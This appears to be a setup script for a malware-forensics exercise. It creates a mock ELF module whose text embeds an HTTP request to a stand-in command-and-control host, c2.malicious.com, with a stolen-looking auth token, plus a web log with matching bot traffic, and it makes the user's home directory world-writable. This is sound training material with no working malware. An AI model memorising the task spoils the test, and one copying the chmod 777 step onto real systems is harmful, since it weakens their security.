#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip binutils
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    cat << 'EOF' > /home/user/suspicious_module.so
\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x03\x00\x3e\x00\x01\x00\x00\x00\x10\x10\x00\x00\x00\x00\x00\x00
Some random binary garbage goes here.
GET /api/v1/update HTTP/1.1
Host: c2.malicious.com
User-Agent: X-Compliance-Bot/v2.4.1-alpha
Accept: */*
Cookie: auth_token_v2=xyz_9988776655_abc
Connection: close
More random binary data.
EOF

    cat << 'EOF' > /home/user/web_traffic.log
192.168.1.10 | 2023-10-10T10:00:00Z | GET /index.html | 200 | Mozilla/5.0 | session_id=123
10.0.5.55 | 2023-10-10T10:05:00Z | POST /api/cmd | 200 | X-Compliance-Bot/v2.4.1-alpha | auth_token_v2=xyz_9988776655_abc
192.168.1.11 | 2023-10-10T10:06:00Z | GET /about.html | 200 | Mozilla/5.0 | session_id=124
172.16.0.4 | 2023-10-10T10:10:00Z | GET /api/v1/update | 200 | X-Compliance-Bot/v2.4.1-alpha | auth_token_v2=xyz_9988776655_abc
10.0.5.55 | 2023-10-10T10:15:00Z | GET /api/v1/update | 200 | X-Compliance-Bot/v2.4.1-alpha | auth_token_v2=xyz_9988776655_abc
10.1.1.1 | 2023-10-10T10:20:00Z | GET / | 403 | X-Compliance-Bot/v1.0 | auth_token_v2=invalid
EOF

    chmod -R 777 /home/user
